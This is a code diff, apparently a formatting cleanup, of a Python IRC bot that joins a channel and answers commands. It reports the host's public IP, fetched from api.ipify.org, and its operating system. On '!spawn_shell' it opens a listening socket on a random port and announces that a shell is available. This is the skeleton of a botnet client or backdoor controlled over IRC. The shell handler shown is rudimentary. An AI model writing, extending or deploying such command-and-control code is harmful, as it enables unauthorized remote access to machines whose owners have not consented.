@@ -8,17 +8,18 @@ import socket
 import random
 import pypsrp
 
-ip = get('https://api.ipify.org').text
+ip = get("https://api.ipify.org").text
+
 
 def shell(port):
     try:
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        hote = ''
+        hote = ""
         print(hote)
-        server.bind((hote,port))
+        server.bind((hote, port))
         server.listen(5)
         server.accept()
-        while (True):
+        while True:
             message = server.recv(1024).decode("utf8")
             if message == "!stop":
                 server.send("Server stopping...".encode("utf8"))
@@ -27,16 +28,17 @@ def shell(port):
             if message == "":
                 pass
     except OSError:
-        server.close()  
+        server.close()
     finally:
         server.close()
 
+
 class MyOwnBot(pydle.Client):
     async def on_connect(self):
-         await self.join('#net')
+        await self.join("#net")
 
     async def on_message(self, target, source, message):
-         # don't respond to our own messages, as this leads to a positive feedback loop
+        # don't respond to our own messages, as this leads to a positive feedback loop
         if message == "!ip":
             await self.message(target, format(ip))
 
@@ -44,8 +46,8 @@ class MyOwnBot(pydle.Client):
             await self.message(target, getos())
 
         if message == "!spawn_shell":
-            port = random.randint(1025,3000)
-            message = "shell available on "+ip+":"+ str(port)
+            port = random.randint(1025, 3000)
+            message = "shell available on " + ip + ":" + str(port)
             await self.message(target, message)
             p = Process(target=shell(port))
             p.start()
@@ -55,12 +57,14 @@ class MyOwnBot(pydle.Client):
             message = "Shell stopped"
             await self.message(target, message)
 
+
 def getos():
     import platform
-    return platform.system()  
-        
+
+    return platform.system()
+
+
 # def check_valid_key():
 
 client = MyOwnBot("BoBiBot", realname="bot")
-client.run('localhost', tls=False, tls_verify=False)
-
+client.run("localhost", tls=False, tls_verify=False)
